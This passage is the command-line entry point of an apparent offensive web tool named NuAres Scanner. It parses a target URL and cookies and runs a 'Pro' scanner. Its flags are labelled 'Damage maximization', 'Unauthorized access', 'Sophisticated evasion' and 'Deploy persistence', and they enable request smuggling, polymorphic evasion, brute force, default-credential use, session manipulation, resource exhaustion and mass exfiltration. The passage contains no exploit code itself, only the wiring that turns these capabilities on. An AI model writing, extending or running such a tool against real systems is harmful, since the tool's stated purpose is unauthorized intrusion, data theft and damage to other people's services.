    # Enhanced options
    parser.add_argument("--evasion-pro", action="store_true", help="Sophisticated evasion")
    parser.add_argument("--damage-max", action="store_true", help="Damage maximization")
    parser.add_argument("--unauth-access", action="store_true", help="Unauthorized access")
    parser.add_argument("--persistence", action="store_true", help="Deploy persistence")

    args = parser.parse_args()

    config = Config(args.config)
    
    # Apply CLI overrides
    if args.threads:
        config.data['threads'] = args.threads
    if args.depth:
        config.data['max_depth'] = args.depth
    if args.safe_mode:
        config.data['safe_mode'] = True
    
    # Enable enhanced features
    if args.evasion_pro:
        config.data['evasion']['smuggling'] = True
        config.data['evasion']['chunked'] = True
        config.data['evasion']['poly_morph'] = True
        
    if args.damage_max:
        config.data['damage_max']['persistence'] = True
        config.data['damage_max']['resource_exhaust'] = True
        config.data['damage_max']['mass_exfil'] = True
        
    if args.unauth_access:
        config.data['unauth_access']['bruteforce'] = True
        config.data['unauth_access']['session_manip'] = True
        config.data['unauth_access']['default_creds'] = True
        
    if args.persistence:
        config.data['damage_max']['persistence'] = True

    # Choose scanner based on features
    if args.evasion_pro or args.damage_max or args.unauth_access or args.persistence:
        scanner = NuAresScannerPro(args.url, config)
        logger.info("Using Enhanced Pro Scanner with advanced capabilities")
    else:
        scanner = NuAresScanner(args.url, config)
        logger.info("Using Standard Scanner")

    # Set cookies if provided
    if args.cookies:
        cookies = {}
        for item in args.cookies.split(';'):
            if '=' in item:
                k, v = item.strip().split('=', 1)
                cookies[k] = v
        scanner.request_core.set_cookies(cookies)

    await scanner.run()

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
